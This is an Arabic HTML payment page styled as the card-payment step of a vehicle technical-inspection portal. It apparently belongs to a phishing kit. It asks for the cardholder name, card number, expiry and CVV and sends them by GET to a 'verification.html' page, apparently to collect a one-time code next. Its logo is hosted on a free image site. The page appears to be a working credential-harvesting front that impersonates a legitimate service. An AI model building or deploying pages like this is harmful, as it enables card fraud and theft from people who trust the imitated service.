<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>إتمام الدفع | بوابة الفحص الفني</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
  <style>
    body{font-family:"Cairo",sans-serif;background:#f8fafc;color:#0f172a}
    header{background:#fff;border-bottom:1px solid #e5e7eb;padding:1rem}
    .page-title{font-size:1.6rem;font-weight:800;color:#0c4a6e}
    .page-sub{color:#0ea5a5;font-weight:700;font-size:1.2rem}
    .booking-form{max-width:700px;margin:2rem auto;background:#fff;border:1px solid #e5e7eb;border-radius:16px;padding:2rem;box-shadow:0 4px 20px rgba(0,0,0,.05)}
    .form-label{font-weight:600}
    .form-control{border:2px solid #e5e7eb;border-radius:8px;padding:.75rem}
    .form-control:focus{border-color:#0ea5a5;box-shadow:0 0 0 3px rgba(14,165,165,.1)}
    .btn-pay{background:#0ea5a5;color:#fff;font-weight:700;border:0;border-radius:10px;padding:.9rem 1.2rem;width:100%}
    .btn-pay:hover{background:#0c8e8e}
  </style>
</head>
<body>

<header class="d-flex align-items-center justify-content-between">
  <img src="https://i.postimg.cc/ZKC5781D/2025-07-04-082630.png" alt="شعار المركز" height="50">
  <div class="text-end">
    <div class="page-sub">خدمة الدفع الإلكتروني</div>
    <div class="page-title">إتمام الدفع</div>
  </div>
</header>

<main class="container">
  <div class="booking-form">
    <h4 class="mb-3"><i class="fa-solid fa-credit-card"></i> بيانات البطاقة</h4>
    <form action="verification.html" method="get">
      <div class="mb-3">
        <label for="card_name" class="form-label">اسم حامل البطاقة</label>
        <input type="text" id="card_name" name="card_name" class="form-control" placeholder="كما هو مكتوب على البطاقة" required>
      </div>

      <div class="mb-3">
        <label for="card_number" class="form-label">رقم البطاقة</label>
        <input type="text" id="card_number" name="card_number" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19" required>
      </div>

      <div class="row">
        <div class="col-md-6 mb-3">
          <label class="form-label">تاريخ الانتهاء</label>
          <div class="d-flex gap-2">
            <select class="form-control" name="expiry_month" required>
              <option value="">شهر</option>
              <option>01</option><option>02</option><option>03</option><option>04</option>
              <option>05</option><option>06</option><option>07</option><option>08</option>
              <option>09</option><option>10</option><option>11</option><option>12</option>
            </select>
            <select class="form-control" name="expiry_year" required>
              <option value="">سنة</option>
              <option>2025</option><option>2026</option><option>2027</option>
              <option>2028</option><option>2029</option><option>2030</option>
            </select>
          </div>
        </div>
        <div class="col-md-6 mb-3">
          <label for="cvv" class="form-label">رمز الأمان (CVV)</label>
          <input type="text" id="cvv" name="cvv" class="form-control" maxlength="4" placeholder="123" required>
        </div>
      </div>

      <button type="submit" class="btn-pay">إتمام الدفع</button>
    </form>
  </div>
</main>

<footer class="py-3 text-center text-muted">
  © 2025 سلامة — جميع الحقوق محفوظة
</footer>

<script>
  // تنسيق رقم البطاقة
  document.getElementById('card_number').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
    e.target.value = value.match(/.{1,4}/g)?.join(' ') || value;
  });

  // السماح فقط بالأرقام في CVV
  document.getElementById('cvv').addEventListener('input', function(e) {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
  });
</script>

</body>
</html>
